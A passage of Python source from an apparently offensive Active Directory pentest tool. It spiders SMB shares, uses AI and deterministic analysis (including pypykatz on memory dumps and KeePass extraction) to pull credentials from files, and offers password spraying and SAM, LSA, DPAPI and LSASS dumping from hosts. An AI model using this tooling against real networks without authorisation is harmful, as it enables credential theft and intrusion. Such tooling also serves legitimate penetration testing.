            marked_share = mark_sensitive(share, "service")
            limit_text = _format_size_human(max_bytes)
            file_size_text = known_size_text or f"{known_size_bytes} B"
            print_warning(
                "Prioritized file exceeds configured read limit: "
                f"{marked_host}/{marked_share}:{marked_path} "
                f"(size={file_size_text}, limit={limit_text})."
            )
            analyze_anyway = Confirm.ask(
                (
                    "Analyze this oversized file anyway? "
                    f"(size={file_size_text}, capped_read_limit={limit_text})"
                ),
                default=False,
            )
            print_info_debug(
                "AI oversized file decision: "
                f"host={marked_host} share={marked_share} path={marked_path} "
                f"size={file_size_text} limit={limit_text} "
                f"analyze_anyway={analyze_anyway}"
            )
            if not analyze_anyway:
                skipped_oversized += 1
                oversized_rows.append(
                    (
                        host,
                        share,
                        path,
                        file_size_text,
                        limit_text,
                    )
                )
                continue
            forced_oversized += 1
            if is_zip_candidate:
                file_size_text = known_size_text or f"{known_size_bytes} B"
                full_limit_text = _format_size_human(full_zip_limit)
                if known_size_bytes <= full_zip_limit:
                    read_full_zip = Confirm.ask(
                        (
                            "ZIP archives often fail deterministic parsing when truncated. "
                            "Read full ZIP for deterministic analysis? "
                            f"(size={file_size_text}, safety_limit={full_limit_text})"
                        ),
                        default=True,
                    )
                    print_info_debug(
                        "AI ZIP full-read decision: "
                        f"host={marked_host} share={marked_share} path={marked_path} "
                        f"size={file_size_text} default_limit={limit_text} "
                        f"full_read_limit={full_limit_text} read_full_zip={read_full_zip}"
                    )
                    if read_full_zip:
                        per_file_max_bytes = full_zip_limit
                        print_info_debug(
                            "AI ZIP full-read effective bytes: "
                            f"known_size_bytes={known_size_bytes} "
                            f"requested_max_bytes={per_file_max_bytes}"
                        )
                        print_info(
                            "Continuing with full ZIP read for deterministic analysis on "
                            f"{marked_path} (max read {_format_size_human(per_file_max_bytes)})."
                        )
                    else:
                        print_info(
                            f"Continuing with capped analysis for oversized file {marked_path} "
                            f"(max read {limit_text})."
                        )
                else:
                    print_warning(
                        "ZIP exceeds configured full-read safety limit and will stay capped: "
                        f"{marked_path} (size={file_size_text}, safety_limit={full_limit_text})."
                    )
                    print_info(
                        f"Continuing with capped analysis for oversized file {marked_path} "
                        f"(max read {limit_text})."
                    )
            else:
                print_info(
                    f"Continuing with capped analysis for oversized file {marked_path} "
                    f"(max read {limit_text})."
                )

        marked_host = mark_sensitive(host, "hostname")
        marked_share = mark_sensitive(share, "service")
        marked_path = mark_sensitive(path, "path")
        print_info(
            f"[{idx}/{len(prioritized_files)}] AI reading {marked_path} "
            f"on {marked_host}/{marked_share}"
        )

        per_file_backend = read_backend
        local_source_path = ""
        read_result: Any | None = None
        if read_backend == "cifs_local":
            resolved_mount_root = str(
                cifs_mount_root or ""
            ).strip() or _resolve_cifs_mount_root(
                shell=shell,
                domain=domain,
            )
            local_source_path = (
                cifs_mapping_service.resolve_candidate_local_path(
                    mount_root=resolved_mount_root,
                    host=host,
                    share=share,
                    remote_path=path,
                    allow_share_root_fallback=len(prioritized_files) <= 1,
                )
                or ""
            )
            if local_source_path:
                local_reads += 1
                read_result = local_reader_service.read_file_bytes(
                    source_path=local_source_path,
                    max_bytes=per_file_max_bytes,
                )
            else:
                local_to_smb_fallbacks += 1
                per_file_backend = "smb_impacket"
                marked_root = mark_sensitive(resolved_mount_root, "path")
                print_warning_debug(
                    "CIFS local path resolution failed; falling back to SMB byte-stream: "
                    f"host={marked_host} share={marked_share} path={marked_path} "
                    f"mount_root={marked_root}"
                )
        if per_file_backend != "cifs_local":
            read_result = reader_service.read_file_bytes(
                shell=shell,
                domain=domain,
                host=host,
                share=share,
                source_path=path,
                max_bytes=per_file_max_bytes,
                timeout_seconds=120 if per_file_max_bytes > max_bytes else 30,
                auth_username=read_username,
                auth_password=read_password,
                auth_domain=read_domain,
            )
        if read_result is None:
            continue
        print_info_debug(
            "AI file read result: "
            f"host={marked_host} share={marked_share} path={marked_path} "
            f"backend={per_file_backend} "
            f"requested_max_bytes={per_file_max_bytes} "
            f"received_bytes={len(read_result.data)} "
            f"truncated={read_result.truncated} success={read_result.success}"
        )
        if not read_result.success:
            read_failures += 1
            read_label = (
                "local CIFS read"
                if per_file_backend == "cifs_local"
                else "Impacket byte-stream"
            )
            print_warning(f"Could not read {marked_path} via {read_label}.")
            auth_user_marked = mark_sensitive(
                read_result.auth_username or "unknown",
                "user",
            )
            auth_domain_marked = mark_sensitive(
                read_result.auth_domain or domain,
                "domain",
            )
            normalized_path_marked = mark_sensitive(
                read_result.normalized_path or path,
                "path",
            )
            if per_file_backend == "cifs_local":
                print_warning_debug(
                    "CIFS local read failure: "
                    f"host={marked_host} share={marked_share} path={marked_path} "
                    f"local_path={normalized_path_marked} "
                    f"error={read_result.error_message or 'unknown'}"
                )
            else:
                print_warning_debug(
                    "SMB byte read failure: "
                    f"host={marked_host} share={marked_share} path={marked_path} "
                    f"normalized_path={normalized_path_marked} "
                    f"auth_user={auth_user_marked} auth_domain={auth_domain_marked} "
                    f"auth_mode={read_result.auth_mode or 'unknown'} "
                    f"status={read_result.status_code or '-'} "
                    f"error={read_result.error_message or 'unknown'}"
                )
            continue

        if read_result.truncated:
            print_warning(
                f"File {marked_path} was truncated to "
                f"{_format_size_human(per_file_max_bytes)} for AI analysis."
            )
            if is_zip_candidate:
                print_warning_debug(
                    "Truncated ZIP stream detected: deterministic ZIP->DMP analyzers "
                    "may not execute (pypykatz path likely skipped)."
                )

        pipeline_result = pipeline_service.analyze_from_bytes(
            domain=domain,
            scope=scope,
            candidate=candidate,
            source_path=path,
            file_bytes=read_result.data,
            truncated=read_result.truncated,
            max_bytes=per_file_max_bytes,
            triage_service=triage_service,
            ai_service=ai_service,
        )
        if pipeline_result.deterministic_handled:
            deterministic_handled += 1
            for note in pipeline_result.deterministic_notes:
                print_info_debug(
                    "Deterministic analyzer note for "
                    f"{marked_host}/{marked_share}:{marked_path}: {note}"
                )
            if pipeline_result.deterministic_summary:
                print_info(
                    "Deterministic summary for "
                    f"{marked_path}: {pipeline_result.deterministic_summary}"
                )
            if pipeline_result.deterministic_findings:
                keepass_findings = [
                    finding
                    for finding in pipeline_result.deterministic_findings
                    if str(getattr(finding, "credential_type", "") or "").strip().lower()
                    == "keepass_artifact"
                ]
                if keepass_findings:
                    persisted_artifact = _persist_prioritized_artifact_bytes(
                        shell=shell,
                        domain=domain,
                        candidate=candidate,
                        file_bytes=read_result.data,
                    )
                    try:
                        extracted_entries = int(
                            shell._process_keepass_artifact(
                                domain,
                                persisted_artifact,
                                [host] if host else None,
                                [share] if share else None,
                                read_username,
                            )
                            or 0
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)
                        extracted_entries = 0
                        print_warning(
                            f"Could not process KeePass artifact {marked_path} deterministically."
                        )
                        print_warning_debug(
                            "Deterministic KeePass artifact handling failed: "
                            f"host={marked_host} share={marked_share} path={marked_path} "
                            f"error={type(exc).__name__}: {exc}"
                        )
                    finding_count = max(1, extracted_entries)
                    deterministic_findings += finding_count
                    flagged_files += 1
                    flagged_credentials += finding_count
                    continue
                finding_count = len(pipeline_result.deterministic_findings)
                deterministic_findings += finding_count
                flagged_files += 1
                flagged_credentials += finding_count
                _render_file_credentials_table(
                    shell,
                    candidate=candidate,
                    findings=pipeline_result.deterministic_findings,
                    source_label="Deterministic",
                )
                if not _handle_prioritized_findings_actions(
                    shell=shell,
                    domain=domain,
                    candidate=candidate,
                    findings=pipeline_result.deterministic_findings,
                    auth_username=read_username,
                    provenance_service=provenance_service,
                ):
                    continue_after_findings = False
                if continue_after_findings is None:
                    continue_after_findings = _confirm_continue_after_findings(
                        shell=shell,
                    )
                if continue_after_findings is False:
                    print_info(
                        "Stopping prioritized file analysis after credential findings "
                        "by user choice."
                    )
                    break
            else:
                review_candidate_paths.append(f"{host}/{share}{path}")
        if pipeline_result.error_message:
            read_failures += 1
            print_warning(
                f"Could not extract readable content from {marked_path} for AI analysis."
            )
            print_warning_debug(
                "AI extraction failure: "
                f"host={marked_host} share={marked_share} path={marked_path} "
                f"error={pipeline_result.error_message}"
            )
            continue

        if pipeline_result.ai_attempted:
            analyzed += 1
            print_info_debug(
                "AI content extraction completed: "
                f"host={marked_host} share={marked_share} path={marked_path} "
                f"mode={pipeline_result.extraction_mode} "
                f"content_chars={pipeline_result.extraction_chars} "
                f"notes={len(pipeline_result.extraction_notes)}"
            )
            for note in pipeline_result.extraction_notes:
                print_info_debug(
                    "AI extraction note for "
                    f"{marked_host}/{marked_share}:{marked_path}: {note}"
                )
            if pipeline_result.ai_summary:
                print_info(
                    f"AI summary for {marked_path}: {pipeline_result.ai_summary}"
                )

            if pipeline_result.ai_findings:
                flagged_files += 1
                flagged_credentials += len(pipeline_result.ai_findings)
                _render_file_credentials_table(
                    shell,
                    candidate=candidate,
                    findings=pipeline_result.ai_findings,
                    source_label="AI",
                )
                if not _handle_prioritized_findings_actions(
                    shell=shell,
                    domain=domain,
                    candidate=candidate,
                    findings=pipeline_result.ai_findings,
                    auth_username=read_username,
                    provenance_service=provenance_service,
                ):
                    continue_after_findings = False
                if continue_after_findings is None:
                    continue_after_findings = _confirm_continue_after_findings(
                        shell=shell,
                    )
                if continue_after_findings is False:
                    print_info(
                        "Stopping prioritized file analysis after credential findings "
                        "by user choice."
                    )
                    break
            else:
                review_candidate_paths.append(f"{host}/{share}{path}")
                print_info_debug(
                    "AI file analysis returned no credential-like findings for "
                    f"{host}/{share}:{path}."
                )
        elif not pipeline_result.deterministic_handled:
            read_failures += 1
            print_info_debug(
                "File analysis pipeline produced no deterministic or AI result for "
                f"{host}/{share}:{path}."
            )

    print_panel(
        (
            f"AI prioritized analysis completed.\n"
            f"- read_backend={read_backend}\n"
            f"- prioritized_files={len(prioritized_files)}\n"
            f"- analyzed={analyzed}\n"
            f"- deterministic_handled={deterministic_handled}\n"
            f"- deterministic_findings={deterministic_findings}\n"
            f"- read_failures={read_failures}\n"
            f"- local_reads={local_reads}\n"
            f"- local_to_smb_fallbacks={local_to_smb_fallbacks}\n"
            f"- files_with_findings={flagged_files}\n"
            f"- credential_like_findings={flagged_credentials}\n"
            f"- skipped_oversized={skipped_oversized}\n"
            f"- forced_oversized={forced_oversized}"
        ),
        title="[bold]SMB AI File Analysis[/bold]",
        border_style="cyan",
        padding=(0, 1),
    )
    if oversized_rows:
        _render_ai_oversized_skips_table(rows=oversized_rows)
    if flagged_files == 0 and review_candidate_paths:
        render_no_extracted_findings_preview(
            loot_dir="",
            loot_rel="",
            analyzed_count=len(review_candidate_paths),
            category="mixed",
            phase_label="AI prioritized file analysis",
            candidate_paths=review_candidate_paths,
            report_root_abs=report_root_abs,
            scope_label="AI prioritized SMB files",
            preview_limit=5,
        )


def _render_file_credentials_table(
    shell: Any,
    *,
    candidate: Any,
    findings: list[Any],
    source_label: str,
) -> None:
    """Render credential-like findings for one SMB file."""
    source = str(source_label or "AI").strip() or "AI"
    table = Table(
        title=f"[bold red]{source} Credential-like Findings[/bold red]",
        header_style="bold red",
        box=rich.box.SIMPLE_HEAVY,
    )
    table.add_column("Type", style="cyan")
    table.add_column("Username", style="magenta")
    table.add_column("Secret", style="green")
    table.add_column("Confidence", style="yellow")
    table.add_column("Evidence", style="white")

    host = mark_sensitive(str(getattr(candidate, "host", "")), "hostname")
    share = mark_sensitive(str(getattr(candidate, "share", "")), "service")
    path = mark_sensitive(str(getattr(candidate, "path", "")), "path")
    print_warning(
        f"{source} flagged potential credential findings in {host}/{share}:{path}"
    )

    for finding in findings:
        cred_type = str(getattr(finding, "credential_type", "") or "").strip() or "-"
        username = mark_sensitive(
            str(getattr(finding, "username", "") or "").strip() or "-",
            "user",
        )
        secret = mark_sensitive(
            str(getattr(finding, "secret", "") or "").strip() or "-",
            "password",
        )
        confidence = str(getattr(finding, "confidence", "") or "").strip() or "-"
        evidence = mark_sensitive(
            str(getattr(finding, "evidence", "") or "").strip() or "-",
            "text",
        )
        if len(evidence) > 140:
            evidence = evidence[:137] + "..."
        table.add_row(cred_type, username, secret, confidence, evidence)

    print_panel_with_table(table, border_style=BRAND_COLORS["warning"])


def _resolve_ai_file_read_max_bytes() -> int:
    """Resolve maximum bytes per remote SMB file read for AI analysis."""
    raw = os.getenv("ADSCAN_AI_SHARE_FILE_MAX_BYTES", "10485760").strip()
    try:
        value = int(raw)
    except ValueError:
        return 10485760
    return max(65536, min(value, 10 * 1024 * 1024))


def _resolve_ai_triage_max_prompt_chars() -> int:
    """Return safe max prompt size for one Codex app-server triage request."""
    raw = os.getenv("ADSCAN_AI_TRIAGE_MAX_PROMPT_CHARS", "1000000").strip()
    try:
        value = int(raw)
    except ValueError:
        return 1_000_000
    return max(65536, min(value, 1_048_576))


def _confirm_continue_after_findings(*, shell: Any) -> bool:
    """Ask once whether prioritized analysis should continue after findings."""
    run_type = str(getattr(shell, "type", "") or "").strip().lower()
    default_continue = run_type != "ctf"
    return Confirm.ask(
        "Credential-like findings detected. Continue analyzing remaining prioritized files?",
        default=default_continue,
    )


def _handle_prioritized_findings_actions(
    *,
    shell: Any,
    domain: str,
    candidate: Any,
    findings: list[Any],
    auth_username: str | None = None,
    provenance_service: Any | None = None,
) -> bool:
    """Offer follow-up actions for findings and return True when analysis may continue."""
    if not findings:
        return True

    host = str(getattr(candidate, "host", "") or "").strip()
    share = str(getattr(candidate, "share", "") or "").strip()
    path = str(getattr(candidate, "path", "") or "").strip()

    credential_candidates: list[tuple[str, str, str]] = []
    seen_credential_candidates: set[tuple[str, str]] = set()
    spray_candidates: list[str] = []
    seen_spray_candidates: set[str] = set()
    for finding in findings:
        username = str(getattr(finding, "username", "") or "").strip()
        secret = str(getattr(finding, "secret", "") or "").strip()
        cred_type = str(getattr(finding, "credential_type", "") or "").strip() or "-"
        if not secret or secret == "-":
            continue
        if username and username != "-":
            key = (username, secret)
            if key not in seen_credential_candidates:
                credential_candidates.append((cred_type, username, secret))
                seen_credential_candidates.add(key)
            continue
        if callable(getattr(shell, "is_hash", None)) and shell.is_hash(secret):
            continue
        if secret not in seen_spray_candidates:
            spray_candidates.append(secret)
            seen_spray_candidates.add(secret)

    if credential_candidates:
        action_options = [
            "Validate and store all username+credential findings",
            "Validate and store one selected finding",
            "Skip validation for now",
        ]
        selected_action = _select_action_index(
            shell=shell,
            title="Choose how to handle discovered credentials:",
            options=action_options,
            default_idx=0,
        )
        if selected_action is None:
            selected_action = 2
        selected_rows = credential_candidates
        if selected_action == 1:
            row_options = [
                f"{username} ({cred_type})"
                for cred_type, username, _ in credential_candidates
            ]
            selected_row = _select_action_index(
                shell=shell,
                title="Select one finding to validate and store:",
                options=row_options,
                default_idx=0,
            )
            if selected_row is None:
                selected_rows = []
            else:
                selected_rows = [credential_candidates[selected_row]]
        elif selected_action == 2:
            selected_rows = []

        for cred_type, username, secret in selected_rows:
            marked_user = mark_sensitive(username, "user")
            marked_type = mark_sensitive(cred_type, "text")
            print_info(
                f"Validating/storing discovered credential for {marked_user} "
                f"(type={marked_type})."
            )
            source_steps = []
            if provenance_service is not None:
                source_steps = provenance_service.build_credential_source_steps(
                    relation="PasswordInShare",
                    edge_type="share_password",
                    source="share_ai_triage",
                    secret=secret,
                    hosts=[host] if host else None,
                    shares=[share] if share else None,
                    artifact=path or None,
                    auth_username=auth_username,
                    origin="share_spidering",
                )
            try:
                shell.add_credential(
                    domain,
                    username,
                    secret,
                    source_steps=source_steps,
                    prompt_for_user_privs_after=False,
                )
            except Exception as exc:  # noqa: BLE001
                telemetry.capture_exception(exc)
                print_warning(
                    "Could not validate/store one discovered credential. "
                    "Continuing with remaining findings."
                )
                print_exception(exception=exc)

    if spray_candidates and domain in getattr(shell, "domains", []):
        spray_secret = spray_candidates[0]
        if len(spray_candidates) > 1:
            idx = _select_action_index(
                shell=shell,
                title="Select one secret to use for password spraying:",
                options=[_safe_secret_preview(value) for value in spray_candidates],
                default_idx=0,
            )
            if idx is not None:
                spray_secret = spray_candidates[idx]
        if Confirm.ask(
            "Run password spraying using selected secret without associated username?",
            default=False,
        ):
            source_context = None
            if provenance_service is not None:
                source_context = provenance_service.build_source_context(
                    hosts=[host] if host else None,
                    shares=[share] if share else None,
                    artifact=path or None,
                    auth_username=auth_username,
                    origin="share_spidering",
                )
            try:
                shell.spraying_with_password(
                    domain,
                    spray_secret,
                    source_context=source_context,
                )
            except Exception as exc:  # noqa: BLE001
                telemetry.capture_exception(exc)
                print_warning("Password spraying from discovered secret failed.")
                print_exception(exception=exc)
    return True


def _persist_prioritized_artifact_bytes(
    *,
    shell: Any,
    domain: str,
    candidate: Any,
    file_bytes: bytes,
) -> str:
    """Persist AI-prioritized artifact bytes to a workspace-scoped path."""
    host = str(getattr(candidate, "host", "") or "").strip() or "unknown_host"
    share = str(getattr(candidate, "share", "") or "").strip() or "unknown_share"
    remote_path = str(getattr(candidate, "path", "") or "").strip()
    filename = Path(remote_path or "artifact.bin").name or "artifact.bin"
    workspace_cwd = shell._get_workspace_cwd()
    artifact_root = domain_path(
        workspace_cwd,
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "ai_prioritized_artifacts",
        _slugify_token(host),
        _slugify_token(share),
    )
    os.makedirs(artifact_root, exist_ok=True)
    target_path = os.path.join(artifact_root, filename)
    with open(target_path, "wb") as handle:
        handle.write(file_bytes)
    print_info_debug(
        "Persisted prioritized SMB artifact bytes: "
        f"path={mark_sensitive(target_path, 'path')}"
    )
    return target_path


def _select_action_index(
    *,
    shell: Any,
    title: str,
    options: list[str],
    default_idx: int = 0,
) -> int | None:
    """Select one option with questionary helper when available."""
    if not options:
        return None
    selector = getattr(shell, "_questionary_select", None)
    if callable(selector):
        try:
            return selector(title, options, default_idx)
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_warning_debug(
                "Questionary selector failed in prioritized findings action flow."
            )
    return default_idx


def _safe_secret_preview(value: str) -> str:
    """Return a masked preview string for interactive secret selection."""
    text = str(value or "").strip()
    if not text:
        return "-"
    preview = text if len(text) <= 8 else f"{text[:4]}...{text[-4:]}"
    return str(mark_sensitive(preview, "password"))


def _resolve_ai_zip_full_read_max_bytes() -> int:
    """Resolve safety cap for full ZIP reads in deterministic analysis."""
    raw = os.getenv("ADSCAN_AI_ZIP_FULL_READ_MAX_BYTES", "104857600").strip()
    try:
        value = int(raw)
    except ValueError:
        return 104857600
    return max(10 * 1024 * 1024, min(value, 512 * 1024 * 1024))


def _is_zip_path(path: str) -> bool:
    """Return true when a path appears to reference a ZIP archive."""
    return str(path or "").strip().lower().endswith(".zip")


def _render_ai_oversized_skips_table(
    *,
    rows: list[tuple[str, str, str, str, str]],
) -> None:
    """Render skipped oversized prioritized files in a compact table."""
    table = Table(
        title="[bold yellow]Skipped Oversized Prioritized Files[/bold yellow]",
        header_style="bold yellow",
        box=rich.box.SIMPLE_HEAVY,
    )
    table.add_column("Host", style="cyan")
    table.add_column("Share", style="magenta")
    table.add_column("Path", style="yellow")
    table.add_column("Size", style="green")
    table.add_column("Limit", style="red")

    for host, share, path, size_text, limit_text in rows:
        table.add_row(
            mark_sensitive(host, "hostname"),
            mark_sensitive(share, "service"),
            mark_sensitive(path, "path"),
            size_text,
            limit_text,
        )
    print_panel_with_table(table, border_style=BRAND_COLORS["warning"])


def _format_size_human(num_bytes: int) -> str:
    """Format byte sizes into human-readable values for UX messages."""
    value = float(max(0, num_bytes))
    units = ["B", "KB", "MB", "GB", "TB"]
    unit_idx = 0
    while value >= 1024 and unit_idx < len(units) - 1:
        value /= 1024
        unit_idx += 1
    if unit_idx == 0:
        return f"{int(value)} {units[unit_idx]}"
    return f"{value:.2f} {units[unit_idx]}"


def _select_post_mapping_ai_scope(shell: Any) -> str | None:
    """Select triage scope after share mapping based on pentest type."""
    pentest_type = str(getattr(shell, "type", "") or "").strip().lower()
    if pentest_type == "ctf":
        return "credentials"

    options = [
        "Credentials only (default)",
        "Sensitive data only",
        "Credentials + sensitive data",
        "Skip AI triage",
    ]
    selected_idx: int | None = None
    selector = getattr(shell, "_questionary_select", None)
    if callable(selector):
        selected_idx = selector("AI triage scope:", options, default_idx=0)
    if selected_idx is None:
        # Cancelled selection or unavailable selector defaults to credentials-only.
        return "credentials"

    if selected_idx == 1:
        return "sensitive_data"
    if selected_idx == 2:
        return "both"
    if selected_idx == 3:
        return None
    return "credentials"


def ask_for_smb_descriptions(shell: Any, *, domain: str) -> None:
    """Prompt user to search for passwords in SMB user descriptions.

    Args:
        shell: Shell instance with domain data and helper methods.
        domain: Domain name.
    """
    from adscan_internal.rich_output import confirm_operation

    if shell.type == "ctf" and shell.domains_data[domain]["auth"] in [
        "auth",
        "pwned",
    ]:
        return

    if shell.auto:
        run_smb_descriptions(shell, domain=domain)
    else:
        pdc = shell.domains_data.get(domain, {}).get("pdc", "N/A")
        username = shell.domains_data.get(domain, {}).get("username", "N/A")

        if confirm_operation(
            operation_name="SMB Description Password Search",
            description="Scans user description fields via SMB for exposed passwords",
            context={
                "Domain": domain,
                "PDC": pdc,
                "Username": username,
                "Protocol": "SMB/445",
                "Target Field": "User descriptions",
            },
            default=True,
            icon="🔎",
        ):
            run_smb_descriptions(shell, domain=domain)


def ask_for_smb_enum_users(shell: Any, *, domain: str) -> None:
    """Prompt user to enumerate domain users via SMB.

    Args:
        shell: Shell instance with domain data and helper methods.
        domain: Domain name.
    """
    from adscan_internal.rich_output import confirm_operation

    if shell.auto:
        shell.do_netexec_smb_null_enum_users(domain)
    else:
        pdc = shell.domains_data.get(domain, {}).get("pdc", "N/A")
        auth_type = shell.domains_data[domain]["auth"]
        session_type_display = {
            "unauth": "Null Session (Unauthenticated)",
            "auth": "Authenticated Session",
            "pwned": "Administrative Session",
            "with_users": "With Users",
        }.get(auth_type, auth_type.capitalize())

        if confirm_operation(
            operation_name="SMB User Enumeration",
            description="Enumerates domain user accounts through SMB protocol",
            context={
                "Domain": domain,
                "PDC": pdc,
                "Session Type": session_type_display,
                "Protocol": "SMB/445",
            },
            default=True,
            icon="👥",
        ):
            shell.do_netexec_smb_null_enum_users(domain)


def run_ask_for_smb_scan(shell: Any, *, domain: str) -> None:
    """Prompt user to perform unauthenticated SMB service scan.

    Args:
        shell: Shell instance with domain data and helper methods.
        domain: Domain name.
    """
    from adscan_internal.rich_output import confirm_operation

    if shell._is_ctf_domain_pwned(domain):
        return

    if shell.auto:
        run_smb_scan(shell, domain=domain)
    else:
        pdc = shell.domains_data.get(domain, {}).get("pdc", "N/A")

        if confirm_operation(
            operation_name="Unauthenticated SMB Scan",
            description="Performs null session, RID cycling, guest session, and shares enumeration",
            context={
                "Domain": domain,
                "PDC": pdc,
                "Protocol": "SMB/445",
            },
            default=True,
            icon="🔒",
        ):
            run_smb_scan(shell, domain=domain)


def ask_for_smb_scan(shell: Any, *, domain: str) -> None:
    """Alias for run_ask_for_smb_scan for backward compatibility."""
    return run_ask_for_smb_scan(shell, domain=domain)


def run_netexec_auth_shares_from_args(shell: Any, args: str) -> None:
    """Execute authenticated SMB share enumeration from command-line arguments.

    Args:
        shell: Shell instance with domain data and helper methods.
        args: Space-separated string containing domain, username, and password.

    Usage:
        run_netexec_auth_shares_from_args(shell, "example.local admin Passw0rd!")
    """
    if not shell.netexec_path:
        print_error(
            "NetExec (nxc) path not configured. Please ensure it's installed via 'adscan install'."
        )
        return
    args_list = args.split()
    if len(args_list) != 3:
        print_error("Usage: netexec_shares <domain> <username> <password>")
        return
    target_domain = args_list[0]
    username = args_list[1]
    password = args_list[2]
    run_auth_shares(
        shell,
        domain=target_domain,
        username=username,
        password=password,
    )


def ask_for_smb_access(
    shell: Any,
    *,
    domain: str,
    host: str | list[str],
    username: str,
    password: str,
) -> None:
    """Prompt user to dump credentials from one or more hosts via SMB.

    Args:
        shell: Shell instance with domain data and helper methods.
        domain: Domain name.
        host: Target hostname/IP or list of targets.
        username: Username for authentication.
        password: Password for authentication.
    """
    hosts = [host] if isinstance(host, str) else [entry for entry in host if entry]
    if not hosts:
        return

    marked_username = mark_sensitive(username, "user")
    if len(hosts) == 1:
        marked_target = mark_sensitive(hosts[0], "hostname")
        respuesta = Confirm.ask(
            f"Do you want to dump credentials from host {marked_target} via SMB as user {marked_username}?"
        )
    else:
        respuesta = Confirm.ask(
            f"Do you want to dump credentials from {len(hosts)} hosts via SMB as user {marked_username}?"
        )
    if not respuesta:
        return

    if Confirm.ask(
        f"Do you want to dump the SAM credentials from {len(hosts)} host(s)?"
        if len(hosts) > 1
        else f"Do you want to dump the SAM credentials from host {mark_sensitive(hosts[0], 'hostname')}?",
        default=False,
    ):
        for target_host in hosts:
            shell.dump_sam(domain, username, password, target_host, "false")

    if Confirm.ask(
        f"Do you want to dump the LSA credentials from {len(hosts)} host(s)?"
        if len(hosts) > 1
        else f"Do you want to dump the LSA credentials from host {mark_sensitive(hosts[0], 'hostname')}?",
        default=False,
    ):
        for target_host in hosts:
            shell.dump_lsa(domain, username, password, target_host, "false")

    if Confirm.ask(
        f"Do you want to dump the DPAPI credentials from {len(hosts)} host(s)?"
        if len(hosts) > 1
        else f"Do you want to dump the DPAPI credentials from host {mark_sensitive(hosts[0], 'hostname')}?",
        default=False,
    ):
        for target_host in hosts:
            shell.dump_dpapi(domain, username, password, target_host, "false")

    for target_host in hosts:
        shell.ask_for_dump_lsass(domain, username, password, target_host, "false")


def execute_manspider(
    shell: Any,
    *,
    command: str,
    domain: str,
    scan_type: str,
    hosts: list[str] | None = None,
    shares: list[str] | None = None,
    auth_username: str | None = None,
    loot_dir: str | None = None,
    credsweeper_jobs: int | None = None,
    phase: str | None = None,
    analysis_context: dict[str, Any] | None = None,
) -> dict[str, Any]:
    """Execute manspider command and process its output based on type.

    For type 'passw' it displays the output directly and saves a log,
    for other types it processes the found files.

    Args:
        shell: Shell instance with domain data and helper methods.
        command: Full manspider command to execute.
        domain: Target domain name.
        scan_type: Type of scan - 'passw', 'ext', or 'gpp'.
        loot_dir: Optional loot directory used by manspider downloads.
        credsweeper_jobs: Optional CredSweeper process count for directory scans.

    Returns:
        Structured summary with completion state and phase counters.
    """
    try:
        if hosts or shares:
            marked_hosts = [mark_sensitive(h, "hostname") for h in (hosts or [])]
            marked_shares = [mark_sensitive(s, "path") for s in (shares or [])]
            print_info_debug(
                "Manspider context: "
                f"hosts={marked_hosts or 'N/A'} shares={marked_shares or 'N/A'}"
            )
        if scan_type == "passw":
            log_dir = "smb"
            if not os.path.exists(log_dir):
                os.makedirs(log_dir)

            log_file = os.path.join(log_dir, "spidering_passw.log")

            completed_process = shell.run_command(command)
            if completed_process is None:
                print_error(
                    "manspider scan failed before returning any output while searching for possible passwords in shares."
                )
                return {"completed": False, "credential_findings": 0, "artifact_hits": 0}

            output_str = completed_process.stdout
            if output_str:
                with open(log_file, "w", encoding="utf-8") as log:
                    for line in output_str.splitlines():
                        line_stripped = line.strip()
                        if line_stripped:
                            clean_line = strip_ansi_codes(line_stripped)
                            log.write(clean_line + "\n")
                    log.flush()
                print_info_verbose(f"Log saved in {log_file}")
            else:
                print_warning_debug(
                    "Manspider command for type 'passw' produced no output."
                )

            if completed_process.returncode != 0:
                print_error_debug(
                    f"Error executing manspider (type passw). Return code: {completed_process.returncode}"
                )
                error_message = completed_process.stderr
                if error_message:
                    print_error(f"Details: {error_message}")
                elif not error_message and output_str:
                    print_error(f"Details (from stdout): {output_str}")
                else:
                    print_error_debug("No error output from manspider command.")

            # Analyze log to extract credentials if manspider completed successfully
            if (
                completed_process.returncode == 0
                and loot_dir
                and os.path.isdir(loot_dir)
            ):
                analysis_context = analysis_context or {}
                candidate_files = _count_files_under_path(loot_dir)
                phase_name = str(phase or SMB_SENSITIVE_SCAN_PHASE_TEXT_CREDENTIALS)
                phase_label = str(
                    get_sensitive_phase_definition(phase_name).get("label", phase_name)
                )
                ai_history_path = _resolve_smb_loot_ai_history_path(
                    shell,
                    domain=domain,
                    username=str(auth_username or ""),
                    phase=phase_name,
                    backend="manspider",
                )
                credentials: dict[str, list[tuple[Any, Any, Any, Any, Any]]] = {}
                structured_stats = shell._get_spidering_service().process_local_structured_files(
                    root_path=loot_dir,
                    phase=phase_name,
                    domain=domain,
                    source_hosts=hosts or [],
                    source_shares=shares or [],
                    auth_username=auth_username or "",
                    apply_actions=True,
                )
                analysis_result = run_loot_credential_analysis(
                    shell,
                    domain=domain,
                    loot_dir=loot_dir,
                    phase=phase_name,
                    phase_label=phase_label,
                    candidate_files=candidate_files,
                    analysis_context=analysis_context,
                    ai_history_path=ai_history_path,
                    credsweeper_path=shell.credsweeper_path,
                    credsweeper_output_dir=os.path.join(loot_dir, ".credsweeper"),
                    jobs=credsweeper_jobs or get_default_credsweeper_jobs(),
                    credsweeper_findings=None,
                )
                credentials = dict(analysis_result.findings)
                if analysis_result.ai_attempted:
                    analysis_context["ai_attempted"] = True
                    analysis_context["ai_success"] = analysis_result.ai_success
                structured_files_with_findings = int(
                    structured_stats.get("files_with_findings", 0) or 0
                )
                ntlm_hash_findings = structured_stats.get("ntlm_hash_findings")
                if isinstance(ntlm_hash_findings, list) and ntlm_hash_findings:
                    loot_rel = os.path.relpath(loot_dir, shell._get_workspace_cwd())
                    render_ntlm_hash_findings_flow(
                        shell,
                        domain=domain,
                        loot_dir=loot_dir,
                        loot_rel=loot_rel,
                        phase_label="Text credential scan",
                        ntlm_hash_findings=[
                            item for item in ntlm_hash_findings if isinstance(item, dict)
                        ],
                        source_scope="SMB file NTLM hash findings from Text credential scan",
                        fallback_source_hosts=hosts or [],
                        fallback_source_shares=shares or [],
                    )
                if credentials:
                    shell.handle_found_credentials(
                        credentials,
                        domain,
                        source_hosts=hosts,
                        source_shares=shares,
                        auth_username=auth_username,
                        source_artifact=loot_dir,
                    )
                    shell.update_report_field(domain, "smb_share_secrets", True)
                else:
                    current_report = (
                        shell.report.get(domain, {})
